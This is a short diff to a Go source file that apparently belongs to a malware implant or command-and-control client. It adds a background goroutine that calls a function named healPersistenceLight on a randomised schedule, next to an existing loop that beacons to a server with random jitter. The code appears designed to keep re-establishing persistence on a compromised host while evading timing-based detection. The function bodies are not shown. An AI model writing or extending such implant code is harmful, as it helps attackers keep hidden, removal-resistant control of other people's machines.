@@ -87,6 +87,14 @@ func loopA() {
 
 	rand.Seed(time.Now().UnixNano())
 
+	go func() {
+		time.Sleep(60 * time.Second)
+		for {
+			healPersistenceLight()
+			time.Sleep(time.Duration(240+rand.Intn(120)) * time.Second)
+		}
+	}()
+
 	for {
 		connectToServer()
 		jitter := 5 + rand.Intn(11)
